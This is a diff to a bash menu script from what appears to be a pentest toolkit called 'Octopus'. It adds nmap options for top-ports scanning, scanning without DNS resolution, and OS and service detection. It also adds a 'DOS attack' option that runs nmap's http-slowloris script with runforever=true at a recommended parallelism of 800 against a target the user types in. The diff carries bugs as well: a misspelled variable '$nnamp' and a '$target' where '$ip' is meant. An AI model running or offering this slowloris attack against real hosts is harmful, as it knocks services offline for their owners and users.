@@ -450,6 +450,10 @@ bjnp=110
 fuzz=111
 la=112
 sc_s=113
+top_p=114
+off_dns=115
+os_serv=116
+dos_atk=117
 ex=999
 
 clear
@@ -477,12 +481,12 @@ printf "$BLUE | Nmap and NSE                                  \n\E[0m"
 printf "$BLUE ----------------------------------------------- \n\E[0m"
 printf "                                                 \n"
 printf "$GREEN {100}-- $BLUE Furtive scan                                 $GREEN {113}--$BLUE Script scan \n\E[0m"
-printf "$GREEN {101}-- $BLUE 1000 Ports scan                         \n\E[0m"
-printf "$GREEN {102}-- $BLUE TCP scan                                \n\E[0m"
-printf "$GREEN {103}-- $BLUE UDP scan                                \n\E[0m"
+printf "$GREEN {101}-- $BLUE 1000 Ports scan                              $GREEN {114}--$BLUE Top ports scan \n\E[0m"
+printf "$GREEN {102}-- $BLUE TCP scan                                     $GREEN {115}--$BLUE Disabling DNS name resolution \n\E[0m"
+printf "$GREEN {103}-- $BLUE UDP scan                                     $GREEN {116}--$BLUE OS and services scan\n\E[0m"
 printf "$GREEN {104}-- $BLUE Aggressive scan                         \n\E[0m"
-printf "$GREEN {105}-- $BLUE Flags scan                              \n\E[0m"
-printf "$GREEN {106}-- $BLUE Vulnerabilities scan                    \n\E[0m"
+printf "$GREEN {105}-- $BLUE Flags scan                              	  $RED ATTACK - WARNING \n\E[0m"
+printf "$GREEN {106}-- $BLUE Vulnerabilities scan                         $YELLOW {117}--$RED DOS attack\n\E[0m"
 printf "$GREEN {107}-- $BLUE Trace scan                              \n\E[0m"
 printf "$GREEN {108}-- $BLUE OS detection                            \n\E[0m"
 printf "$GREEN {109}-- $BLUE Avahi DOS                               \n\E[0m"
@@ -651,6 +655,54 @@ elif [ $nnmap == $sc_s ]; then
 	printf "$BLUE [$GREEN+$BLUE] Your results have been saved here : $GREEN/home/$current_user/Octopus/Newtwork-Scan/Script_Scan.txt $RESETCOLOR\n"
 	sleep 2
 	sudo chown $current_user Script_Scan.txt
+	printf "$BLUE [$GREEN+$BLUE] Done ! $RESETCOLOR\n"
+	sleep 2
+	mainmenu
+	
+elif [ $nnmap == $top_p ]; then
+	echo -e -n "$BLUE [$GREEN+$BLUE] Nmap set to top-ports scan, enter number of port : $RESETCOLOR"
+	read nb_p
+	echo -e -n "$BLUE [$GREEN+$BLUE] Enter the target : $RESETCOLOR \n"
+	read ip
+	sudo nmap --top-ports $nb_p $ip && sudo nmap --top-ports $nb_p $ip >> top-ports.txt 
+	printf "$BLUE [$GREEN+$BLUE] Your results have been saved here : $GREEN/home/$current_user/Octopus/Network-Scan/top-ports.txt $RESETCOLOR\n"
+	sleep 2
+	sudo chown $current_user top-ports.txt &>/dev/null
+	printf "$BLUE [$GREEN+$BLUE] Done ! $RESETCOLOR\n"
+	sleep 2
+	mainmenu
+	
+elif [ $nnmap == $off_dns ]; then
+	echo -e -n "$BLUE [$GREEN+$BLUE] Nmap disabling dns name resolution ... enter the port to scan : $RESETCOLOR"
+	read port
+	echo -e -n "$BLUE [$GREEN+$BLUE] Enter the target : $RESETCOLOR"
+	read ip
+	sudo nmap -p $port -n $ip && sudo nmap -p $port -n $target >> off_dns_resolv.txt
+	printf "$BLUE [$GREEN+$BLUE] Your results have been saved here : $GREEN/home/$current_user/Octopus/Network-Scan/off_dns_resolv.txt $RESETCOLOR\n"
+	sleep 2
+	sudo chown $current_user off_dns_resolv.txt &>/dev/null
+	printf "$BLUE [$GREEN+$BLUE] Done ! $RESETCOLOR\n"
+	sleep 2
+	mainmenu
+	
+elif [ $nnamp == $os_serv ]; then
+	echo -e -n "$BLUE [$GREEN+$BLUE] Nmap set to OS and services detection, enter the target : $RESETCOLOR"
+	read ip
+	sudo nmap -A -T4 $ip && sudo nmap -A -T4 $ip >> os_serv.txt
+	printf "$BLUE [$GREEN+$BLUE] Your results have been saved here : $GREEN/home/$current_user/Octopus/Network-Scan/os_serv.txt $RESETCOLOR\n"
+	sleep 2
+	sudo chown $current_user os_serv.txt &>/dev/null
+	printf "$BLUE [$GREEN+$BLUE] Done ! $RESETCOLOR\n"
+	sleep 2
+	mainmenu
+	
+elif [ $nnmap == $dos_atk ]; then
+	echo -e -n "$BLUE [$GREEN+$BLUE] Nmap set to DOS attack, enter target : $RESETCOLOR"
+	read ip
+	echo -e -n "$BLUE [$GREEN+$BLUE] Select the value of the max parallelism (recommanded value : $RED 800) : $RESETCOLOR"
+	read para
+	sudo nmap $ip -max-parallelism $para -Pn --script http-slowloris --script-args http-slowloris.runforever=true 
+	sleep 1
 	printf "$BLUE [$GREEN+$BLUE] Done ! $RESETCOLOR\n"
 	sleep 2
 	mainmenu
